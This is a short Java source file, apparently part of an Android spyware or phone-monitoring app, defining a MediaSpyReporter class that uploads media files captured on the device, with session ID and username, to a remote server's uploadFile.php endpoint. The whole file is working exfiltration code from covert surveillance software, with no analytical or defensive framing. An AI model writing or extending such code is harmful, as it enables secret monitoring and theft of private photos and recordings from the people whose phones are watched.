package org.ddth.android.spy.reporter;

import java.util.HashMap;
import java.util.Map;

import org.ddth.http.core.connection.Request;
import org.ddth.http.impl.connection.HttpMultipartRequest;
import org.ddth.mobile.monitor.core.Report;
import org.ddth.mobile.monitor.report.Media;

public class MediaSpyReporter extends SpyReporter {
	/**
	 * This is for remote storage folder name.
	 */
	private String username;
	
	public MediaSpyReporter(String username) {
		this.username = username;
	}
	
	@Override
	protected Request createRequest(Report report) {
		Media media = (Media) report;
		Map<String, String> parameters = new HashMap<String, String>();
		parameters.put("sID", getSession());
		parameters.put("username", username);
		parameters.put("type", media.type);
		parameters.put("file", null);
		return new HttpMultipartRequest(WEBAPI_SERVER_ROOT + "/uploadFile.php", parameters, media.file);
	}
}
